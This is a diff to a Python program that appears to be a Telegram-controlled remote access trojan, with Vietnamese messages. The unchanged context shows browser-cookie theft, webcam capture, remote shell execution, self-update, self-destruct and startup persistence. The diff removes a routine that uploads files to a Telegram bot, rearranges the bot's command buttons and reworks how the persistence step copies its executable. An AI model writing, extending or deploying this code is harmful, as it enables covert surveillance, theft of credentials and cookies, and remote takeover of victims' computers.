@@ -887,29 +887,6 @@ def get_browser_data():
         send_telegram_message(f"❌ Lỗi lấy dữ liệu browser: {e}")
         return False
 
-def send_debug_log():
-    if os.path.exists(DEBUG_LOG):
-        temp_log = os.path.join(os.getenv('TEMP', STORAGE), f"debug_{int(time.time())}.log")
-        try:
-            shutil.copy2(DEBUG_LOG, temp_log)
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            with open(temp_log, 'rb') as f:
-                r = requests.post(url, data={'chat_id': CHAT_ID, 'caption': '📜 File Debug Log của hệ thống'}, files={'document': f}, timeout=25)
-            try:
-                os.remove(temp_log)
-            except:
-                pass
-            if r.status_code == 200 and r.json().get('ok'):
-                log_message("Sent debug.log to Telegram successfully.")
-                return True
-            else:
-                send_telegram_message(f"❌ Lỗi gửi file debug: {r.text}")
-        except Exception as e:
-            send_telegram_message(f"❌ Lỗi gửi file debug: {e}")
-    else:
-        send_telegram_message("❌ Tệp debug.log chưa tồn tại.")
-    return False
-
 def self_update(file_id_or_url):
     state = load_state()
     my_name = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
@@ -1083,7 +1060,7 @@ def execute_command(command, message=None):
                 [
                     {"text": "📷 Webcam", "callback_data": f"webcam @{my_name}"},
                     {"text": "🔍 Cookies", "callback_data": f"browser @{my_name}"},
-                    {"text": "📜 Debug Log", "callback_data": f"debug @{my_name}"}
+                    {"text": "🗑️ Xóa logs", "callback_data": f"clear @{my_name}"}
                 ],
                 [
                     {"text": "⏱️ Intervals", "callback_data": f"interval @{my_name}"},
@@ -1091,7 +1068,6 @@ def execute_command(command, message=None):
                     {"text": "🏷️ Đổi tên", "callback_data": f"name @{my_name}"}
                 ],
                 [
-                    {"text": "🗑️ Xóa logs", "callback_data": f"clear @{my_name}"},
                     {"text": "🔄 Cập nhật", "callback_data": f"update @{my_name}"},
                     {"text": "💥 Tự hủy", "callback_data": f"destruct @{my_name}"}
                 ],
@@ -1105,10 +1081,6 @@ def execute_command(command, message=None):
             f"<b>✅ Trạng thái [{machine}]</b>\n{status_str}\nThời gian chạy: {datetime.now() - session_start_time}",
             reply_markup=inline_kb
         )
-
-    elif cmd.startswith("/debug") or cmd.startswith("debug") or cmd.startswith("/log") or cmd.startswith("log"):
-        send_telegram_message("📜 Đang gửi file debug.log...")
-        send_debug_log()
 
     elif cmd.startswith("/update") or cmd.startswith("update"):
         parts = command.strip().split()
@@ -1337,15 +1309,17 @@ def add_to_startup(force=False):
                 subprocess.Popen([deleter], shell=True, creationflags=0x08000000)
                 sys.exit(0)
         else:
-            # Fallback for Python development runs
-            if not os.path.exists(target_path) or os.path.getsize(current_exe) != os.path.getsize(target_path):
-                if os.path.exists(target_path):
-                    try: os.remove(target_path)
-                    except: pass
-                shutil.copy2(current_exe, target_path)
+            # Fallback for Python development runs: copy setup.exe if present, NEVER python.exe!
+            dev_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "setup.exe")
+            if os.path.exists(dev_exe):
+                if not os.path.exists(target_path) or os.path.getsize(dev_exe) != os.path.getsize(target_path):
+                    if os.path.exists(target_path):
+                        try: os.remove(target_path)
+                        except: pass
+                    shutil.copy2(dev_exe, target_path)
         return True
     except Exception as e:
-        print(f"⚠️ Lỗi Startup: {e}")
+        log_message(f"⚠️ Lỗi Startup: {e}")
         return False
 
 def run_remote_shell(command):
